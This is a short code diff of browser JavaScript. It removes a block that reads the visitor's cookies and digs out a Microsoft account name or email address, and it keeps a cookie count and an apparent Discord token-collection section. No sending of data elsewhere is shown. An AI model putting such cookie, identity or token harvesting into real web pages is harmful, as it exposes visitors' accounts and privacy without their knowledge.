@@ -132,25 +132,7 @@ let d='';
 const box=document.getElementById('info');
 
 // COOKIES
-let allCookies = document.cookie;
-d+=`🍪 ${allCookies.split(';').length} cookies<br>`;
-
-// Get Chrome/Microsoft username from cookies
-let userName = 'Not found';
-try{
-  // Check for Microsoft account in cookies
-  if(allCookies.includes('MSCC') || allCookies.includes('MSPAUTH')){
-    let msMatch = allCookies.match(/MSCC=([^;]+)/);
-    if(msMatch) userName = decodeURIComponent(msMatch[1]);
-  }
-  // Check for Chrome profile
-  if(allCookies.includes('CHROME') || allCookies.includes('ACCOUNT_CHOOSER')){
-    let chromeMatch = allCookies.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/);
-    if(chromeMatch) userName = chromeMatch[0];
-  }
-}catch(e){}
-
-d+=`👤 User: ${userName}<br>`;
+d+='🍪 '+document.cookie.split(';').length+' cookies<br>';
 
 // DISCORD DATA
 let tok=[];
